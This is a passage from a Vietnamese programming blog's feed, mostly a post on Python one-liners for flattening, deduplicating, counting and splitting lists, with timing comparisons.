&lt;/div&gt;
&lt;div class="section" id="tom-tat"&gt;
&lt;h2&gt;Tóm tắt&lt;/h2&gt;
&lt;p&gt;Trong kỳ này chúng ta đã được giới thiệu về mô hình hoạt động của giao thức CGI, các yếu tố quan trọng trong một chương trình CGI viết bằng ngôn ngữ Python, một ít kiến thức về giao thức HTTP, và sự đa dạng của thế giới trình duyệt web. Ở kỳ sau chúng ta sẽ tìm hiểu cách nhận dữ liệu từ máy khách qua URL và mẫu đơn (form).&lt;/p&gt;
&lt;/div&gt;
</content><category term="cgi"></category><category term="http"></category></entry><entry><title>Python One-Liner</title><link href="/2010/01/python-one-liner.html" rel="alternate"></link><published>2010-01-22T16:30:00+07:00</published><updated>2010-01-22T16:30:00+07:00</updated><author><name>Phạm Thị Minh Hoài</name></author><id>tag:None,2010-01-22:/2010/01/python-one-liner.html</id><summary type="html">&lt;p&gt;&lt;strong&gt;Python One-Liner&lt;/strong&gt; là trường phái viết Python trên một dòng. Theo đó mỗi một hành động xác định được viết bởi các lệnh cô đọng gom lại trên một dòng duy nhất. &lt;strong&gt;Hành động xác định&lt;/strong&gt; không phải là những hành động quá phức tạp, nhưng cũng không quá đơn …&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;strong&gt;Python One-Liner&lt;/strong&gt; là trường phái viết Python trên một dòng. Theo đó mỗi một hành động xác định được viết bởi các lệnh cô đọng gom lại trên một dòng duy nhất. &lt;strong&gt;Hành động xác định&lt;/strong&gt; không phải là những hành động quá phức tạp, nhưng cũng không quá đơn giản. Ví dụ việc trao đổi giá trị giữa hai biến có thể coi là một hành động xác định như vậy. Python cho phép thực hiện điều này trên một dòng với một lệnh duy nhất, và với tôi đó là một trong những lệnh Python đẹp nhất:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;Python One-Liners&lt;/strong&gt; cũng chính là tập hợp các mẹo (trick) Python nhằm giải quyết các bài toán nhỏ một cách ngắn gọn theo phương châm &lt;a class="reference external" href="http://wiki.python.org/moin/Powerful%20Python%20One-Liners"&gt;&amp;quot;do a lot with a little.&amp;quot;&lt;/a&gt; Điều này thường khó thực hiện ở các ngôn ngữ khác. Nhưng chúng có thể thực hiện được trong Python do đặc trưng ngôn ngữ hỗ trợ cách viết như vậy. Chẳng hạn cách dùng hàm lambda, List Comprehensions, &lt;tt class="docutils literal"&gt;map&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;filter&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;zip&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;dict&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;set&lt;/tt&gt;... đã xây dựng những đặc trưng ngôn ngữ cho phép viết các mã ngắn gọn hơn các ngôn ngữ khác.&lt;/p&gt;
&lt;p&gt;Trong bài viết này tôi sẽ tổng hợp một số các bài toán đơn giản mà triển khai Python có thể được viết trên một dòng. Chúng là các bài toán cơ bản có liên quan đến &lt;strong&gt;list&lt;/strong&gt;. Tôi hi vọng những bạn chưa biết về các công thức trong bài này sẽ tìm thấy nhiều điểm lý thú, và qua đó càng hiểu được sức mạnh và sự hấp dẫn tuyệt vời của Python. Các công thức này một số được tôi thường xuyên sử dụng, một số được sưu tầm và các bạn có thể tìm thấy ở đâu đó trên internet.&lt;/p&gt;
&lt;div class="section" id="lam-phang-mot-list"&gt;
&lt;h2&gt;1. Làm phẳng một list&lt;/h2&gt;
&lt;p&gt;Cho một list dạng hai chiều như sau: &lt;strong&gt;L = [[1,2,3], [4,5,6], [7], [8,9]]&lt;/strong&gt; hãy biến nó thành dạng một chiều dạng &lt;strong&gt;[1, 2, 3, 4, 5, 6, 7, 8, 9]&lt;/strong&gt;. Đây là một số lời giải một dòng của bài toán này:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;L&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;],[&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;]]&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[])&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;reduce&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;itertools&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;chain&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  &lt;span class="c1"&gt;#import itertools.&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;item&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;sublist&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;L&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;sublist&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;em&gt;Python cung cấp cho bạn một tập hợp phong phú các cú pháp và hàm dựng sẵn cho phép bạn giải cùng một bài toán theo nhiều cách khác nhau.&lt;/em&gt; Trong các lời giải trên lời giải cuối cùng là nhanh nhất và nó cũng dễ hiểu nhất. Chi tiết các lời giải trên các bạn có thể xem trên trang: &lt;a class="reference external" href="http://stackoverflow.com/questions/952914/making-a-flat-list-out-of-list-of-lists-in-python"&gt;Making a flat list out of list of lists in python&lt;/a&gt;. Hàm &lt;strong&gt;reduce&lt;/strong&gt; đã bị loại bỏ kể từ Python 3000 (&lt;a class="reference external" href="http://www.artima.com/weblogs/viewpost.jsp?thread=98196"&gt;Suggested by Guido van Rossum&lt;/a&gt;), tuy nhiên vẫn được giữa lại trong thư viện &lt;strong&gt;functools&lt;/strong&gt;, do vậy bạn có thể dùng:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;functools&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;reduce&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Nếu list L không phải là hai chiều, mà có thể chứa các list con đệ quy, bạn có thể dùng hàm sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;def flatten(seq, a = list()):&lt;/span&gt;
&lt;span class="go"&gt;    try:&lt;/span&gt;
&lt;span class="go"&gt;        for item in seq:&lt;/span&gt;
&lt;span class="go"&gt;            flatten(item, a)&lt;/span&gt;
&lt;span class="go"&gt;    except TypeError:&lt;/span&gt;
&lt;span class="go"&gt;        a.append(seq)&lt;/span&gt;
&lt;span class="go"&gt;    return a&lt;/span&gt;

&lt;span class="go"&gt;print flatten([[1,2, [3,4], 5], 6, [7, [8, 9]]])&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="loai-bo-cac-phan-tu-trung-nhau-trong-list"&gt;
&lt;h2&gt;2. Loại bỏ các phần tử trùng nhau trong list&lt;/h2&gt;
&lt;p&gt;Hãy tạo ra một list mới chứa các phần tử không trùng nhau của L. Một số cách giải trên một dòng:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;L&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;dict&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fromkeys&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keys&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  &lt;span class="c1"&gt;# Python 3.x trả về iterator&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;L&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;enumerate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Với &lt;strong&gt;L = [5,6,1,1,1,2,2,2,3,3,3]&lt;/strong&gt; hai lời giải trên cho kết quả &lt;strong&gt;[1, 2, 3, 5, 6]&lt;/strong&gt;. Lời giải cuối cùng cho kết quả &lt;strong&gt;[5, 6, 1, 2, 3]&lt;/strong&gt;. Như vậy trong một số tình huống lời giải cuối cùng tốt hơn, do nó vẫn giữ được thứ tự các phần tử như ban đầu. Tuy vậy lời giải cuối cùng chạy rất chậm. Hãy xem kết quả đo thời gian chạy của các lời giải như sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;timeit&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Timer&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;list(set(L))&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;L = range(10**4)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;0.030437396173560671&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;dict.fromkeys(L).keys()&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;L = range(10**4)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;0.027800167602894277&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;[x for i, x in enumerate(L) if i==L.index(x)]&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;L = range(10**4)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;25.005568798618903&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Việc &lt;em&gt;so sánh thời gian chạy&lt;/em&gt; giữa các &lt;strong&gt;Python One-Liner&lt;/strong&gt; rất hay được các tác giả thực hiện. Chúng đánh giá khả năng sử dụng thực tế của mỗi công thức. Lời giải cuối cùng như các bạn thấy dù có ưu điểm song không thể dùng được khi có test xấu trên 10000 phần tử.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="dem-so-phan-tu-co-trong-mot-list"&gt;
&lt;h2&gt;3. Đếm số phần tử có trong một list&lt;/h2&gt;
&lt;p&gt;Nếu chỉ đếm một phần tử thì quá đơn giản, dùng &lt;strong&gt;list.count&lt;/strong&gt; là xong, nhưng nếu để đếm tần số cho nhiều item một lúc thì làm thế nào. Chẳng hạn có &lt;strong&gt;L = [5,6,1,1,1,2,2,2,3,3]&lt;/strong&gt; muốn tạo ra &lt;strong&gt;D={5:1, 6:1, 1:3, 2:3, 3:2}&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;dict&lt;/span&gt;&lt;span class="p"&gt;([(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="p"&gt;)])&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="p"&gt;)}&lt;/span&gt; &lt;span class="c1"&gt;# dict comprehensions, có từ Python 3.x&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;collections&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Counter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# import collections, có từ Python 3.x&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Lời giải số một tuy dài nhưng có thể chạy trên hầu hết các bản Python &amp;gt; 2.4. Lời giải số hai chẳng qua là từ 1 ra nhưng với cú pháp mới của Python 3.x nó dễ hiểu và đơn giản hơn. Lời giải cuối cùng đơn giản đến mức bạn chỉ cần có &lt;strong&gt;import collections&lt;/strong&gt;. Module &lt;strong&gt;collections&lt;/strong&gt;  chứa các phương tiện cho phép bạn viết các mã Python ngắn gọn, và chạy rất nhanh. Một ví dụ khác về cách dùng &lt;strong&gt;Counter&lt;/strong&gt; trong module &lt;strong&gt;collections&lt;/strong&gt;, đoạn mã này cho phép đếm tần số xuất hiện của các ký tự trong một string:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;collections&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Counter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;abcabca&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;Counter({&amp;#39;a&amp;#39;: 3, &amp;#39;c&amp;#39;: 2, &amp;#39;b&amp;#39;: 2})&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Càng về sau này các phiên bản Python càng hỗ trợ nhiều hơn các cú pháp và thư viện cho phép bạn viết các mã ngắn gọn hơn. Đây là đặc trưng của Python: &lt;em&gt;Viết ít hơn làm nhiều hơn&lt;/em&gt;. Việc gia tăng hiểu biết của bạn về các thư viện là một kinh nghiệm quan trọng.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="chia-mot-list-thanh-nhieu-list"&gt;
&lt;h2&gt;4. Chia một list thành nhiều list&lt;/h2&gt;
&lt;p&gt;Bài toán chia một list thành nhiều list có thể gặp hai yêu cầu:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Chia list thành nhiều list có độ dài bằng nhau&lt;/li&gt;
&lt;li&gt;Chia list thành n list con có độ dài tương đương nhau (với khác biệt kích thước nhỏ nhất).&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Vấn đề số một có thể giải quyết bằng các hàm sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;SplitInto&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;:(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; \
&lt;span class="gp"&gt;... &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;SplitInto&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;[[0, 1, 2], [3, 4, 5], [6, 7, 8], [9]]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;SplitInto&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;zip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;chain&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;repeat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;))]&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;SplitInto&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;zip object at 0x01D607D8&amp;gt;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;SplitInto&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="go"&gt;[(0, 1, 2), (3, 4, 5), (6, 7, 8), (9, None, None)]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;SplitInto&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;zip_longest&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;iter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
